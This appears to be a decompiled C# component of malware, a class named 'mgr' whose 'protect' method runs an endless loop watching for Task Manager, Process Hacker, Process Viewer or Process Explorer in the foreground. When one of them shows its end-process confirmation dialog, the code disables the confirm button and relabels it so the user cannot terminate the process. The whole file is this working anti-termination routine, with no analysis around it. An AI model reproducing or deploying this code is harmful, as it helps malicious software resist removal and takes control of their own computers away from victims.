using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace w;

public class mgr
{
	private delegate bool EnumWindProc(int hWnd, int lParam);

	private delegate bool EnumChildWindProc(int hWnd, int lParam);

	private List<IntPtr> CLD;

	public mgr()
	{
		CLD = new List<IntPtr>();
	}

	[DllImport("user32.dll")]
	private static extern bool EnableWindow(IntPtr hWnd, bool bEnable);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetClassNameA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, int nMaxCount);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(int hwnd, StringBuilder lpString, int cch);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowTextLength(int hwnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumChildWindows(IntPtr hWnd, EnumWindProc lpEnumFunc, ref IntPtr lParam);

	private bool EnumChild(int hWnd, int lParam)
	{
		CLD.Add((IntPtr)hWnd);
		return true;
	}

	public void protect()
	{
		while (true)
		{
			Thread.Sleep(200);
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow.ToInt32() == 0)
			{
				continue;
			}
			int lpdwProcessID = 0;
			GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
			if (lpdwProcessID <= 0)
			{
				continue;
			}
			string text = "";
			int windowTextLength = GetWindowTextLength((int)foregroundWindow);
			List<IntPtr> list;
			int num;
			checked
			{
				if (windowTextLength == 0)
				{
					text = "";
				}
				else
				{
					StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
					text = ((GetWindowText((int)foregroundWindow, stringBuilder, stringBuilder.Capacity) != 0) ? stringBuilder.ToString() : "");
				}
				Process processById = Process.GetProcessById(lpdwProcessID);
				if (!((Operators.CompareString(processById.ProcessName.ToLower(), "taskmgr", false) == 0) | (Operators.CompareString(processById.ProcessName.ToLower(), "processviewer", false) == 0) | (Operators.CompareString(processById.ProcessName.ToLower(), "processhacker", false) == 0) | (Operators.CompareString(text.ToLower(), "process explorer", false) == 0)))
				{
					continue;
				}
				list = new List<IntPtr>();
				num = 0;
				IntPtr[] child = GetChild(foregroundWindow);
				foreach (IntPtr intPtr in child)
				{
					string lpClassName = Strings.Space(200);
					int classNameA = GetClassNameA((int)intPtr, ref lpClassName, 200);
					lpClassName = lpClassName.Remove(classNameA, 200 - classNameA);
					if (Operators.CompareString(lpClassName.ToLower(), "button", false) == 0)
					{
						list.Add(intPtr);
					}
					if ((Operators.CompareString(lpClassName.ToLower(), "static", false) == 0) | (Operators.CompareString(lpClassName.ToLower(), "directuihwnd", false) == 0))
					{
						num++;
					}
				}
			}
			if (list.Count == 2 && (num == 2 || num == 1))
			{
				EnableWindow(list[0], bEnable: false);
				int hwnd = (int)list[0];
				string lParam = "End process";
				SendMessageA(hwnd, 12, 0, ref lParam);
			}
		}
	}

	private IntPtr[] GetChild(IntPtr hwd)
	{
		lock (this)
		{
			CLD.Clear();
			EnumWindProc lpEnumFunc = EnumChild;
			IntPtr lParam = (IntPtr)0;
			EnumChildWindows(hwd, lpEnumFunc, ref lParam);
			return CLD.ToArray();
		}
	}
}
